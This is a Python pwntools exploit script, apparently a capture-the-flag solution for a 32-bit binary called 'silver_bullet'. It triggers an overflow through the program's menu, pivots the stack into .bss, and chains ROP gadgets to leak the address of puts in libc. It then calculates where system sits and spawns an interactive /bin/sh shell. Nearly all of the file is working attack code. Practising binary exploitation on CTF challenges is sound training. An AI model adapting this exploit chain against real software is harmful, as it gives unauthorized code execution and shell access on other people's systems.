#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf  = ELF('./silver_bullet')
libc = ELF('/usr/lib32/libc.so.6')

# ROP Gadget
pop_ebp_ret     = 0x08048a7b  # pop ebp ; ret
pop_edi_ebp_ret = 0x08048a7a  # pop edi ; pop ebp ; ret
leave_ret       = 0x08048558  # leave ; ret

# libc offsets
libc_puts   = libc.sym['puts']
libc_system = libc.sym['system']
libc_bin_sh = list(libc.search(b'/bin/sh'))[0]

# Byte sequence alias
A4 = 4 * b'A'


def main():
    # proc = remote('', )
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    pivot_dest = elf.bss() + 0x800

    # Stack pivot
    payload  = p32(elf.sym['read_input'])  # ret
    payload += p32(pop_edi_ebp_ret)        # read_input()'s ret addr
    payload += p32(pivot_dest)             # read_input()'s 1st arg
    payload += p32(0x7fffffff)             # read_input()'s 2nd arg
    payload += p32(pop_ebp_ret)            # ret
    payload += p32(pivot_dest)             # ebp
    payload += p32(leave_ret)              # ret

    proc.sendafter('Your choice :', b'1')
    proc.sendafter('bullet :', b'9' * 40)
    proc.sendafter('Your choice :', b'2')
    proc.sendafter('bullet :', b'9' * 8)
    proc.sendafter('Your choice :', b'2')
    proc.sendafter('bullet :', b'AAAAAAA' + payload)

    proc.sendafter('Your choice :', b'3')
    proc.sendafter('Your choice :', b'3')
    proc.recvuntil('You win !!\n')

    # After stack pivoting
    payload  = p32(pivot_dest + 0x30)      # ebp
    payload += p32(elf.sym['puts'])        # ret
    payload += p32(pop_ebp_ret)            # puts()'s ret addr
    payload += p32(elf.got['puts'])        # puts()'s 1st arg
    payload += p32(elf.sym['read_input'])  # ret
    payload += p32(pop_edi_ebp_ret)        # read_input()'s ret addr
    payload += p32(pivot_dest + 4 * 11)    # read_input()'s 1st arg
    payload += p32(4)                  # read_input()'s 2nd arg
    payload += p32(pop_edi_ebp_ret)        # ret
    payload += p32(0)                      # edi
    payload += p32(pivot_dest + 4 * 11)    # ebp
    payload += p32(0)                      # system@libc (reserved)
    payload += p32(0)                      # system@libc's ret addr
    payload += p32(pivot_dest + 4 * 14)         # system@libc's 1st arg
    payload += b'/bin/sh'
    proc.send(payload)

    puts_addr = int.from_bytes(proc.recv(4), 'little')
    system_addr = puts_addr + (libc_system - libc_puts)
    #bin_sh_addr = puts_addr + (libc_bin_sh - libc_puts)
    log.info('puts@libc:   {}'.format(hex(puts_addr)))
    log.info('system@libc: {}'.format(hex(system_addr)))
    #log.info('bin_sh@libc: {}'.format(hex(bin_sh_addr)))

    payload  = p32(system_addr)
    time.sleep(0.5)
    proc.send(payload)

    proc.interactive()

if __name__ == '__main__':
    main()
